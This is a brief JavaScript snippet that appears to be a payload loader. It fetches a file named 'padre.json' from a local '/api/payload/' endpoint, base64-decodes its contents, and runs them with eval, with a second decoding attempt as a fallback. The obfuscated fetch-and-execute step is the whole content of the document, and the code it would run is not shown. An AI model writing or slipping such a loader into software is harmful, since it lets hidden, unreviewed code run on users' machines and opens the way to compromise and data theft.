(async function(){
  try {
    const resp = await fetch('http://localhost:3000/api/payload/padre.json');
    const j = await resp.json();
    try { eval(atob(j.c)); return; } catch(e){}
    try { eval(decodeURIComponent(escape(atob(j.c)))); return; } catch(e){}
    console.error('Failed to execute padre payload');
  } catch (err) {
    console.error('Error loading padre payload', err);
  }
})();